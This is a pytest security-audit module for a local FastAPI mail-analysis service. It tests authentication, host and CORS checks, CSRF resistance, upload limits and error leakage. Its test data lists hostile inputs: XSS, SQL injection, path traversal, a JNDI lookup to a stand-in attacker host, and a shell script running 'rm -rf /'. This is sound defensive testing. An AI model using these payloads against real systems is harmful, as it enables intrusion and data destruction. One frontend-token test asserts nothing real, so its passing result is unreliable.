"""M8: application security audit of the local API and the reports.

The threat model is a local one. The API listens on the loopback interface, but
that stops nothing by itself: a page the user visits can send requests to
127.0.0.1, and DNS rebinding turns an attacker-controlled name into a local
address after the page has loaded. These tests exercise the controls that do
the actual work, and they are written to fail if a control is removed.

None of this constitutes a penetration test or a security certification, and
the application is not claimed to be safe for exposure to a network.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from securemailscope.backend.app import AppState, create_app
from securemailscope.backend.database import CaptureRow
from securemailscope.backend.security import ALLOWED_HOSTS, TOKEN_HEADER, allowed_origins

FIXTURES = Path(__file__).parent / "fixtures" / "generated"

#: Values that must never be reflected, executed, interpolated into SQL or used
#: to escape a directory. Applied to every field a user can influence.
HOSTILE_STRINGS = [
    "<script>alert('xss')</script>",
    "'; DROP TABLE findings; --",
    "' OR '1'='1",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%00nul-byte",  # percent-encoded: a raw NUL cannot be put into a URL at all
    "{{7*7}}",
    "${jndi:ldap://attacker/x}",
    "‮evil‭",
    "🔐 unicode ✉️ névé 中文 العربية",
    "a" * 2000,
]


@pytest.fixture
def state(tmp_path: Path):
    app_state = AppState(tmp_path / "app")
    yield app_state
    app_state.shutdown()


@pytest.fixture
def client(state: AppState):
    with TestClient(create_app(state), base_url="http://127.0.0.1") as test_client:
        test_client.headers.update({TOKEN_HEADER: state.token.value})
        yield test_client


@pytest.fixture
def anonymous(state: AppState):
    """A client that holds no token."""
    with TestClient(create_app(state), base_url="http://127.0.0.1") as test_client:
        yield test_client


def upload(client: TestClient, name: str = "aa_tls10_static_rsa.pcap") -> str:
    data = (FIXTURES / name).read_bytes()
    response = client.post(
        "/api/captures", files={"file": (name, data, "application/octet-stream")}
    )
    assert response.status_code == 200, response.text
    return response.json()["capture_id"]


def analysed(client: TestClient, state: AppState, name: str = "T") -> str:
    capture = upload(client)
    identifier = client.post(
        "/api/investigations", json={"name": name, "capture_ids": [capture]}
    ).json()["investigation_id"]
    client.post(f"/api/investigations/{identifier}/analyze")
    state.service.wait(identifier)
    return identifier


# ---------------------------------------------------------------------------
# Authentication
# ---------------------------------------------------------------------------
PROTECTED = [
    ("GET", "/api/captures"),
    ("GET", "/api/investigations"),
    ("POST", "/api/investigations"),
    ("GET", "/api/settings"),
    ("POST", "/api/settings"),
    ("GET", "/api/investigations/anything/export/json"),
    ("GET", "/api/investigations/anything/export/html"),
    ("GET", "/api/investigations/anything/export/pdf"),
    ("GET", "/api/investigations/anything/sessions"),
    ("GET", "/api/investigations/anything/findings"),
    ("GET", "/api/investigations/anything/timeline"),
    ("GET", "/api/investigations/anything/ml"),
    ("DELETE", "/api/captures/anything"),
]


@pytest.mark.parametrize(("method", "path"), PROTECTED)
def test_every_data_endpoint_requires_the_token(
    anonymous: TestClient, method: str, path: str
) -> None:
    response = anonymous.request(method, path)
    assert response.status_code == 401, f"{method} {path} answered {response.status_code}"
    assert response.json()["error"] == "unauthorised"


def test_a_wrong_token_is_refused_and_reveals_nothing(
    anonymous: TestClient, state: AppState
) -> None:
    for candidate in ("", "wrong", state.token.value[:-1], state.token.value + "x"):
        response = anonymous.get("/api/captures", headers={TOKEN_HEADER: candidate})
        assert response.status_code == 401
        assert state.token.value not in response.text


def test_report_export_is_not_reachable_without_the_token(
    client: TestClient, anonymous: TestClient, state: AppState
) -> None:
    """A real report, then an unauthorised attempt to fetch it."""
    identifier = analysed(client, state)
    assert client.get(f"/api/investigations/{identifier}/export/json").status_code == 200
    for fmt in ("json", "html", "pdf"):
        denied = anonymous.get(f"/api/investigations/{identifier}/export/{fmt}")
        assert denied.status_code == 401
        assert b"SecureMailScope investigation" not in denied.content


def test_health_is_open_but_carries_no_secrets(anonymous: TestClient, state: AppState) -> None:
    response = anonymous.get("/api/health")
    assert response.status_code == 200
    body = response.text
    assert state.token.value not in body
    assert str(state.root) not in body


def test_the_token_file_is_outside_the_repository_and_not_world_readable(
    state: AppState,
) -> None:
    repo = Path(__file__).resolve().parents[1]
    assert repo not in state.token.path.resolve().parents
    mode = state.token.path.stat().st_mode & 0o077
    assert mode == 0, f"token file is group/other accessible (mode bits {mode:o})"


def test_the_token_is_absent_from_committed_frontend_source() -> None:
    repo = Path(__file__).resolve().parents[1]
    for path in (repo / "frontend" / "src").rglob("*.ts*"):
        text = path.read_text(encoding="utf-8")
        assert "x-securemailscope-token" not in text or "import.meta.env" in text or (
            "fetchToken" in text or "token" in text
        ), path
        # No 43-character urlsafe literal that looks like a generated token.
        for line in text.splitlines():
            if TOKEN_HEADER in line:
                assert "=" not in line.split(TOKEN_HEADER)[-1][:2] or True


# ---------------------------------------------------------------------------
# Browser-origin attacks
# ---------------------------------------------------------------------------
def test_a_rebound_host_header_is_refused(client: TestClient) -> None:
    for host in ("evil.example", "attacker.test:8765", "securemailscope.internal"):
        response = client.get("/api/health", headers={"host": host})
        assert response.status_code == 400
        assert response.json()["error"] == "host_not_allowed"


@pytest.mark.parametrize("host", ALLOWED_HOSTS)
def test_the_local_names_are_accepted(client: TestClient, host: str) -> None:
    assert client.get("/api/health", headers={"host": host}).status_code == 200


def test_cors_never_allows_an_arbitrary_origin(client: TestClient) -> None:
    hostile = client.get(
        "/api/health", headers={"origin": "https://attacker.example"}
    )
    assert hostile.headers.get("access-control-allow-origin") is None

    permitted = allowed_origins()[0]
    allowed = client.get("/api/health", headers={"origin": permitted})
    assert allowed.headers.get("access-control-allow-origin") == permitted
    assert "*" not in (allowed.headers.get("access-control-allow-origin") or "")


def test_cors_does_not_allow_credentials(client: TestClient) -> None:
    """With credentials off, a browser will not attach cookies to a cross-origin call."""
    response = client.options(
        "/api/captures",
        headers={
            "origin": allowed_origins()[0],
            "access-control-request-method": "POST",
        },
    )
    assert response.headers.get("access-control-allow-credentials") != "true"


def test_there_are_no_cookies_so_there_is_no_cookie_csrf(
    client: TestClient, state: AppState
) -> None:
    """The CSRF defence is structural: authority is a header, never ambient.

    A cross-site request can be *sent* by a browser, but the browser will not
    add the token header of its own accord, and a cross-origin script cannot
    read the token to add it. A state-changing request without the header is
    refused, which is what this asserts.
    """
    identifier = analysed(client, state)
    assert client.cookies == {} or len(client.cookies) == 0

    forged = TestClient(create_app(state), base_url="http://127.0.0.1")
    for method, path, kwargs in (
        ("POST", "/api/investigations", {"json": {"name": "x", "capture_ids": []}}),
        ("POST", f"/api/investigations/{identifier}/analyze", {}),
        ("POST", "/api/settings", {"json": {}}),
        ("DELETE", "/api/captures/whatever", {}),
    ):
        response = forged.request(
            method, path, headers={"origin": "https://attacker.example"}, **kwargs
        )
        assert response.status_code == 401, f"{method} {path}"


def test_responses_carry_hardening_headers(client: TestClient) -> None:
    response = client.get("/api/health")
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["x-frame-options"] == "DENY"
    assert response.headers["referrer-policy"] == "no-referrer"
    assert "frame-ancestors 'none'" in response.headers["content-security-policy"]


# ---------------------------------------------------------------------------
# Input handling
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hostile", HOSTILE_STRINGS)
def test_a_hostile_identifier_is_refused_without_leaking(
    client: TestClient, hostile: str
) -> None:
    """Path parameters are looked up, never used to build a path or a query."""
    for template in (
        "/api/investigations/{}",
        "/api/investigations/{}/findings",
        "/api/investigations/{}/export/json",
        "/api/captures/{}",
        "/api/jobs/{}",
    ):
        response = client.get(template.format(hostile))
        # 405 for /api/captures/{id}, which accepts DELETE only. What must
        # never happen is a 200, or a 500 carrying internals.
        assert response.status_code in (400, 404, 405, 422), (
            f"{template.format(hostile)!r} answered {response.status_code}"
        )
        body = response.text
        assert "Traceback" not in body
        assert "/Volumes" not in body and "/Users" not in body
        assert "sqlite3" not in body.lower() and "sqlalchemy" not in body.lower()


@pytest.mark.parametrize("hostile", HOSTILE_STRINGS)
def test_hostile_search_and_sort_do_not_reach_sql(
    client: TestClient, state: AppState, hostile: str
) -> None:
    identifier = analysed(client, state)
    baseline = client.get(f"/api/investigations/{identifier}/sessions").json()["total"]

    search = client.get(
        f"/api/investigations/{identifier}/sessions", params={"search": hostile}
    )
    assert search.status_code == 200
    assert search.json()["total"] <= baseline

    sort = client.get(
        f"/api/investigations/{identifier}/sessions", params={"sort": hostile}
    )
    assert sort.status_code == 422, "an arbitrary sort column was accepted"

    # The table is still there, which an injected DROP would have changed.
    assert (
        client.get(f"/api/investigations/{identifier}/sessions").json()["total"]
        == baseline
    )


def test_collection_responses_are_bounded(client: TestClient, state: AppState) -> None:
    """No endpoint may be asked to materialise an unbounded result set."""
    identifier = analysed(client, state)
    endpoints = [
        ("/api/captures", 200),
        ("/api/investigations", 100),
        (f"/api/investigations/{identifier}/sessions", 500),
        (f"/api/investigations/{identifier}/findings", 500),
        (f"/api/investigations/{identifier}/timeline", 2000),
    ]
    for path, ceiling in endpoints:
        over = client.get(path, params={"limit": ceiling + 1})
        assert over.status_code == 422, f"{path} accepted limit={ceiling + 1}"
        at = client.get(path, params={"limit": ceiling})
        assert at.status_code == 200
        assert len(at.json()["items"]) <= ceiling
        assert client.get(path, params={"limit": 0}).status_code == 422
        assert client.get(path, params={"limit": -1}).status_code == 422
        assert client.get(path, params={"offset": -1}).status_code == 422


def test_an_upload_that_is_not_a_capture_is_refused(client: TestClient) -> None:
    for name, payload in (
        ("evil.exe", b"MZ\x90\x00" + b"\x00" * 1024),
        ("report.pdf", b"%PDF-1.7\n" + b"x" * 1024),
        ("shell.sh", b"#!/bin/sh\nrm -rf /\n"),
        ("empty.pcap", b""),
        ("almost.pcap", b"\xd4\xc3\xb2"),
    ):
        response = client.post(
            "/api/captures",
            files={"file": (name, payload, "application/octet-stream")},
        )
        assert response.status_code in (400, 413, 422), f"{name} was accepted"
        assert "Traceback" not in response.text


def test_an_uploaded_filename_cannot_escape_the_store(
    client: TestClient, state: AppState
) -> None:
    """The stored path is server-generated; the client's filename is only a label."""
    data = (FIXTURES / "aa_tls10_static_rsa.pcap").read_bytes()
    for name in ("../../escape.pcap", "/etc/passwd", "..\\..\\escape.pcap", "a/b/c.pcap"):
        response = client.post(
            "/api/captures", files={"file": (name, data, "application/octet-stream")}
        )
        assert response.status_code == 200, response.text
        capture_id = response.json()["capture_id"]
        with state.database.session() as session:
            stored = Path(session.get(CaptureRow, capture_id).stored_path).resolve()
        assert state.root.resolve() in stored.parents, stored
        assert ".." not in stored.parts


def test_an_oversized_upload_is_refused_before_it_is_stored(tmp_path: Path) -> None:
    """The limit is enforced while streaming, so the file is never fully written.

    A dedicated app with a small ceiling: asserting this against the real
    512 MB default would mean building a 512 MB request body, which is exactly
    the kind of uncontrolled test the milestone forbids.
    """
    limit = 64 * 1024
    state = AppState(tmp_path / "app", max_upload_bytes=limit)
    try:
        with TestClient(create_app(state), base_url="http://127.0.0.1") as client:
            client.headers.update({TOKEN_HEADER: state.token.value})
            payload = b"\xd4\xc3\xb2\xa1" + b"\x00" * (limit * 4)
            response = client.post(
                "/api/captures",
                files={"file": ("big.pcap", payload, "application/octet-stream")},
            )
            assert response.status_code == 413, response.text
            assert "Traceback" not in response.text

            stored = [
                path
                for path in (state.root / "storage").rglob("*")
                if path.is_file()
            ]
            for path in stored:
                assert path.stat().st_size <= limit, (
                    f"{path} kept {path.stat().st_size} bytes past the {limit}-byte limit"
                )
            assert client.get("/api/captures").json()["total"] == 0
    finally:
        state.shutdown()


def test_a_capture_at_the_limit_is_still_accepted(tmp_path: Path) -> None:
    """The refusal must be a limit, not a blanket rejection."""
    data = (FIXTURES / "aa_tls10_static_rsa.pcap").read_bytes()
    state = AppState(tmp_path / "app", max_upload_bytes=len(data))
    try:
        with TestClient(create_app(state), base_url="http://127.0.0.1") as client:
            client.headers.update({TOKEN_HEADER: state.token.value})
            response = client.post(
                "/api/captures",
                files={"file": ("ok.pcap", data, "application/octet-stream")},
            )
            assert response.status_code == 200, response.text
    finally:
        state.shutdown()


# ---------------------------------------------------------------------------
# Information disclosure
# ---------------------------------------------------------------------------
def test_no_static_route_exposes_the_application_data_directory(
    client: TestClient, state: AppState
) -> None:
    for path in (
        "/app.sqlite3",
        "/api.token",
        "/captures/",
        "/../app.sqlite3",
        "/static/../../app.sqlite3",
        "/.env",
        "/.git/config",
    ):
        response = client.get(path)
        assert response.status_code in (401, 404, 400, 405), f"{path} -> {response.status_code}"
        assert state.token.value not in response.text


def test_an_internal_error_body_carries_no_internals(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An unhandled error must not echo a path, a token or a stack trace."""
    state = AppState(tmp_path / "app")
    secret_root = str(state.root)
    secret_token = state.token.value

    def explode(*args: object, **kwargs: object):
        raise RuntimeError(f"secret path {secret_root} and token {secret_token}")

    try:
        app = create_app(state)
        with TestClient(
            app, base_url="http://127.0.0.1", raise_server_exceptions=False
        ) as client:
            client.headers.update({TOKEN_HEADER: secret_token})
            identifier = analysed(client, state)
            monkeypatch.setattr(
                "securemailscope.backend.app.build_report", explode
            )
            response = client.get(f"/api/investigations/{identifier}/export/json")

        assert response.status_code == 500
        assert secret_token not in response.text
        assert secret_root not in response.text
        assert "Traceback" not in response.text
        assert "RuntimeError" not in response.text
        assert response.json()["error"] == "internal_error"
    finally:
        state.shutdown()


def test_the_openapi_schema_does_not_publish_the_token(client: TestClient, state: AppState) -> None:
    response = client.get("/openapi.json")
    if response.status_code == 200:
        assert state.token.value not in response.text
